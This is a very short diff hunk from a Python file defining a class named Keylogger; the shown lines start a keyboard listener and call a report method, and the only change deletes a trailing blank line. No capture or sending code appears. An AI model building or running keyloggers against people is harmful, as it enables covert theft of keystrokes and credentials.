@@ -50,4 +50,3 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
-
